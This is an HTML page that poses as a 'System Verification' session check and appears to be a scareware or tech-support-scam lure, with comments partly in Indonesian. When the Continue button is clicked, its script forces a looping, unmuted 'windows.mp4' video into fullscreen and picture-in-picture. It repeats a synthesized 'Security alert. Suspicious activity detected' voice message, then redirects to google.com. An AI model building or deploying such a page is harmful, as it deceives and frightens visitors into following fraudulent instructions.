<!DOCTYPE html>
<html>
<head>
  <title>System Verification</title>
  <style>
    body { margin:0; background:black; color:white; font-family:sans-serif; text-align:center; }
    #overlay {
      position:absolute; top:40%; width:100%; z-index:2;
    }
    #startBtn {
      padding:12px 24px; font-size:16px;
    }
  </style>
</head>
<body>

<div id="overlay">
  <h2>Verifying your session...</h2>
  <p>Please wait...</p>
  <button id="startBtn">Continue</button>
</div>

<video id="v"
  src="windows.mp4"
  controls
  playsinline
  style="width:100%; height:100%; object-fit:cover;">
</video>

<script>
let speaking = false;
let speechMsg;

async function start() {
  const v = document.getElementById("v");
  const btn = document.getElementById("startBtn");

  // Disable button biar tidak spam
  btn.disabled = true;

  // 🎬 Play video
  try {
    v.muted = false;
    v.volume = 1;
    v.loop = true;
    await v.play();
  } catch(e){ console.warn("Video play failed", e); }

  // 🔥 Fullscreen immersive
  try {
    if (v.requestFullscreen) {
      await v.requestFullscreen();
    }
  } catch(e){ console.warn("Fullscreen failed", e); }

  // 🖼️ Try PiP (floating video)
  try {
    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
      await v.requestPictureInPicture();
    }
  } catch(e){ console.warn("PiP failed", e); }

  // 🔊 SpeechSynthesis loop
  function speakLoop() {
    if (speaking) return;
    speaking = true;

    speechMsg = new SpeechSynthesisUtterance(
      "Security alert. Suspicious activity detected. Please follow the instructions on this page."
    );

    let voices = speechSynthesis.getVoices();

    if (voices.length > 0) {
      speechMsg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
      speechSynthesis.speak(speechMsg);
    } else {
      speechSynthesis.onvoiceschanged = () => {
        const loadedVoices = speechSynthesis.getVoices();
        speechMsg.voice = loadedVoices.find(v => v.lang.includes("en")) || loadedVoices[0];
        speechSynthesis.speak(speechMsg);
      };
    }

    speechMsg.onend = () => {
      speaking = false;
      speakLoop();
    };
  }

  speakLoop();

  // ⏱️ Redirect ke site legit setelah delay
  setTimeout(() => {
    window.location.href = "https://www.google.com";
  }, 1500);
}

document.getElementById("startBtn").addEventListener("click", start);
</script>

</body>
</html>
